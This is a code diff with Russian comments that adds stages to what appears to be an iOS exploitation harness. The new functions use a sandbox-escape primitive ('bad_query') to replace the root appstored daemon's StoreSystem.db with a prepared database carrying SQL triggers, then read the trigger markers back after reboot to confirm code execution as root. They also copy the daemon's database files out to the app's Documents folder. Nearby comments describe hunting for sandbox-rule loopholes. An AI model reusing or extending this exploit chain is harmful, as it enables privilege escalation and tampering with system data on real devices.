@@ -48781,6 +48781,156 @@ static void p_bq122(void) {
     fsync(fileno(stderr));
 }
 
+// p_bq123 — v288: РЕКОН ЧЕРЕЗ ТРИГГЕРЫ: какие таблицы appstored пишет при старте?
+// §274 доказал: демон открывает нашу БД и пишет (cc bump). Ставим на КАЖДУЮ
+// таблицу демона (39) триггеры INSERT/UPDATE/DELETE, пишущие маркеры в
+// fz27_marker. После ребута p_bq124 читает маркеры → карта boot-write
+// демона + ДОКАЗАТЕЛЬСТВО исполнения нашего SQL в root-процессе.
+// Готовим StoreSystem-triggers.db на Mac, копируем в Documents, фаза подкладывает.
+static void p_bq123(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    LOG("[bq123] v288: подложка БД с триггерами-маркерами (§277-next)");
+    fsync(fileno(stderr));
+    int64_t h = bad_query((char *)"/var/containers/Data/System", 0, (char *)grp, 0);
+    if (h < 0) { LOG("[bq123] escape FAIL"); return; }
+    NSString *docs = NSSearchPathForDirectoriesInDomains(
+        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
+    const char *srcname = getenv("FUZZ_BQ123_SRC") ?: "StoreSystem-triggers.db";
+    const char *dst = "/var/containers/Data/System/3E27999E-F441-4625-A423-AF11E87F71E8/Library/StoreSystem.db";
+    const char *srcp = [[docs stringByAppendingPathComponent:
+                        [NSString stringWithUTF8String:srcname]]
+                        fileSystemRepresentation];
+
+    struct stat stx = {0};
+    if (stat(dst, &stx) == 0 && !getenv("FUZZ_BQ121_FORCE")) {
+        LOG("[bq123] StoreSystem.db уже есть (%lld) — нужен FORCE", (long long)stx.st_size);
+        bad_query_release(h); return;
+    }
+    if (stat(dst, &stx) == 0) {
+        if (unlink(dst) != 0) LOG("[bq123] unlink errno %d", errno);
+        else LOG("[bq123] старый удалён");
+    }
+    FILE *sf = fopen(srcp, "rb");
+    if (!sf) { LOG("[bq123] %s отсутствует в Documents", srcname); bad_query_release(h); return; }
+    fseek(sf, 0, SEEK_END); long sz = ftell(sf); fseek(sf, 0, SEEK_SET);
+    unsigned char *buf = (unsigned char *)malloc((size_t)sz);
+    if (fread(buf, 1, (size_t)sz, sf) != (size_t)sz) { fclose(sf); LOG("[bq123] read FAIL"); bad_query_release(h); return; }
+    fclose(sf);
+    FILE *df = fopen(dst, "wb");
+    if (!df) { LOG("[bq123] dst FAIL errno %d", errno); free(buf); bad_query_release(h); return; }
+    fwrite(buf, 1, (size_t)sz, df); fflush(df); fsync(fileno(df)); fclose(df);
+    FILE *vf = fopen(dst, "rb");
+    unsigned char *vbuf = (unsigned char *)malloc((size_t)sz);
+    size_t vr = fread(vbuf, 1, (size_t)sz, vf); fclose(vf);
+    LOG("[bq123] подложено %ld байт, read-back identical=%d", sz,
+        (vr == (size_t)sz && memcmp(vbuf, buf, (size_t)sz) == 0));
+    free(vbuf); free(buf);
+    bad_query_release(h);
+    LOG("[bq123] ИТОГ: ребутни устройство → p_bq124");
+    fsync(fileno(stderr));
+}
+
+// p_bq124 — читаем маркеры: какие таблицы/операции писал демон при старте.
+static void p_bq124(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    LOG("[bq124] v288: чтение маркеров boot-write (§277)");
+    fsync(fileno(stderr));
+    int64_t h = bad_query((char *)"/var/containers/Data/System", 0, (char *)grp, 0);
+    if (h < 0) { LOG("[bq124] escape FAIL"); return; }
+    const char *dbp = "/var/containers/Data/System/3E27999E-F441-4625-A423-AF11E87F71E8/Library/StoreSystem.db";
+    struct stat st = {0};
+    if (stat(dbp, &st) != 0) {
+        LOG("[bq124] StoreSystem.db УДАЛЁН демоном (schema-wipe?)");
+        bad_query_release(h); return;
+    }
+    LOG("[bq124] db: %lld байт mtime=%ld", (long long)st.st_size, (long)st.st_mtime);
+    // читаем хвост файла глазами (не sqlite): ищем ASCII 'fz27_marker' и имена
+    FILE *f = fopen(dbp, "rb");
+    if (!f) { LOG("[bq124] open FAIL errno %d", errno); bad_query_release(h); return; }
+    // маленькая БД — читаем целиком (лимит 8MB)
+    fseek(f, 0, SEEK_END); long sz = ftell(f); fseek(f, 0, SEEK_SET);
+    if (sz > 8*1024*1024) { fclose(f); LOG("[bq124] слишком большой"); bad_query_release(h); return; }
+    unsigned char *d = (unsigned char *)malloc((size_t)sz);
+    if (fread(d, 1, (size_t)sz, f) != (size_t)sz) { fclose(f); LOG("[bq124] read FAIL"); bad_query_release(h); return; }
+    fclose(f);
+    LOG("[bq124] size=%ld, hex-head 32: %02x%02x%02x%02x...", sz, d[0], d[1], d[2], d[3]);
+    // маркеры: строки вида 'fz27:<table>:<op>' в страницах — ищем подстроку
+    const char *needle = "fz27:";
+    size_t nl = strlen(needle);
+    int hits = 0;
+    for (long o = 0; o + nl < sz && hits < 60; o++) {
+        if (memcmp(d + o, needle, nl) == 0) {
+            char ctx[64]; int cl = 0;
+            for (long k = o; k < o + 40 && k < sz && cl < 60; k++) {
+                unsigned char c = d[k];
+                ctx[cl++] = (c >= 0x20 && c < 0x7f) ? c : '.';
+            }
+            ctx[cl] = 0;
+            LOG("[bq124] MARKER @0x%lx: %s", (unsigned long)o, ctx);
+            hits++;
+            o += nl;
+        }
+    }
+    LOG("[bq124] маркеров: %d (%s)", hits,
+        hits ? "*** НАШ SQL ИСПОЛНИЛСЯ В ROOT ***" : "нет — демон не писал таблицы");
+    free(d);
+    bad_query_release(h);
+    fsync(fileno(stderr));
+}
+
+// p_bq125 — v289: вытащить StoreSystem.db после ребута в Documents (для локального SELECT маркеров).
+static void p_bq125(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    LOG("[bq125] v289: копия StoreSystem.db → Documents");
+    fsync(fileno(stderr));
+    int64_t h = bad_query((char *)"/var/containers/Data/System", 0, (char *)grp, 0);
+    if (h < 0) { LOG("[bq125] escape FAIL"); return; }
+    NSString *docs = NSSearchPathForDirectoriesInDomains(
+        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
+    const char *src = "/var/containers/Data/System/3E27999E-F441-4625-A423-AF11E87F71E8/Library/StoreSystem.db";
+    struct stat st = {0};
+    if (stat(src, &st) != 0) { LOG("[bq125] stat FAIL errno %d", errno); bad_query_release(h); return; }
+    LOG("[bq125] размер %lld mtime=%ld", (long long)st.st_size, (long)st.st_mtime);
+    FILE *f = fopen(src, "rb");
+    if (!f) { LOG("[bq125] fopen FAIL %d", errno); bad_query_release(h); return; }
+    char out[600];
+    snprintf(out, sizeof(out), "%s/ss-boot.db", docs.fileSystemRepresentation);
+    FILE *o = fopen(out, "wb");
+    unsigned long tot = 0;
+    if (o) { char buf[65536]; size_t r;
+        while ((r = fread(buf, 1, sizeof(buf), f)) > 0) { fwrite(buf,1,r,o); tot += r; }
+        fclose(o);
+        LOG("[bq125] copied %lu → ss-boot.db (%s)", tot,
+            tot == (unsigned long)st.st_size ? "OK" : "MISMATCH");
+    }
+    fclose(f);
+    // также -wal/-shm если есть
+    static const char *sufs[] = { "-wal", "-shm" };
+    for (unsigned i = 0; i < 2; i++) {
+        char wp[600];
+        snprintf(wp, sizeof(wp), "%s%s", src, sufs[i]);
+        struct stat ws = {0};
+        if (stat(wp, &ws) == 0 && S_ISREG(ws.st_mode) && ws.st_size > 0) {
+            FILE *wf = fopen(wp, "rb");
+            if (wf) {
+                char out2[600];
+                snprintf(out2, sizeof(out2), "%s/ss-boot%s.db", docs.fileSystemRepresentation, sufs[i]);
+                FILE *o2 = fopen(out2, "wb");
+                unsigned long t2 = 0;
+                if (o2) { char buf[65536]; size_t r;
+                    while ((r = fread(buf, 1, sizeof(buf), wf)) > 0) { fwrite(buf,1,r,o2); t2 += r; }
+                    fclose(o2);
+                    LOG("[bq125] %s: %lu байт", sufs[i], t2);
+                }
+                fclose(wf);
+            }
+        } else LOG("[bq125] %s отсутствует", sufs[i]);
+    }
+    bad_query_release(h);
+    LOG("[bq125] ИТОГ: копия готова");
+    fsync(fileno(stderr));
+}
+
 // p_bq87 — v246: SANDBOX-ЛАЗЕЙКИ — что 27.2 ЗАКРЫЛ, а b4 ещё открыт?
 // security_sandbox кекст: +133 правил в 27.2. Каждое новое правило =
 // что-то было РАЗРЕШЕНО в 27.0 (наш b4) и ЗАПРЕЩЕНО в 27.2.
@@ -57417,6 +57567,9 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_BQ120")) { p_bq120(); LOG("[probe13] bq120-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ121")) { p_bq121(); LOG("[probe13] bq121-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ122")) { p_bq122(); LOG("[probe13] bq122-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ123")) { p_bq123(); LOG("[probe13] bq123-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ124")) { p_bq124(); LOG("[probe13] bq124-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ125")) { p_bq125(); LOG("[probe13] bq125-only mode, stop"); return NULL; }
         if (getenv("FUZZ_XPCENUM")) { p_xpcenum(); LOG("[xpcen] xpcenum-only mode, stop"); return NULL; }
         if (getenv("FUZZ_ASTRIS")) { p_astris(); LOG("[probe13] astris-only mode, stop"); return NULL; }
         if (getenv("FUZZ_NETV6")) { p_netv6(); LOG("[probe13] netv6-only mode, stop"); return NULL; }
